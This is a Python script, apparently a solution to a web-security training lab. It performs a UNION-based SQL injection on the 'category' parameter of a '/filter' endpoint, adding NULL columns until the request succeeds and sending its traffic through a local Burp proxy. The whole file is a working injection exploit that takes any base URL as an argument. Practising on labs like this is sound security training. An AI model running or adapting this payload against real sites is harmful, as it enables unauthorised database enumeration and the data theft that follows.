#! /usr/bin/env python

import requests  # to make web requests
import sys  # system module to use for arguments


def exploit(base_url: str) -> None:
    null = "NULL" #adding null variable
    count = 1 #dding count so we can see how many columns there are
    while True:    
        response = requests.get(
            base_url + "/filter",
            params={"category": f'Clothing, shoes and accessories \' UNION SELECT {null}-- '},#fstring for nulls to dynamically add it in, needed to escape the ' before UNION so used \.
            proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
            verify=False,
        )  # category is the key and the value is clothing, everything after the ? are the parameters in the URL also sending through Burp
        print(response.text)
        
        if response.status_code == 200:
            print(f"you have successfully completed the lab,there are {count} columns in the table!") #used an f string to add the count variable in
            break #break out of the while loop once we hit the 200 status code
        else:
            null = null + ",NULL" # once it fails we need to add more nulls onto the null variable for next itertation 
            count = count+1 # we increment the count to give us the next column number
        
        


def main() -> None:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} ,<base_url>")
        exit(1)
    requests.packages.urllib3.disable_warnings()
    exploit(sys.argv[1].rstrip("/"))


if __name__ == "__main__":
    main()
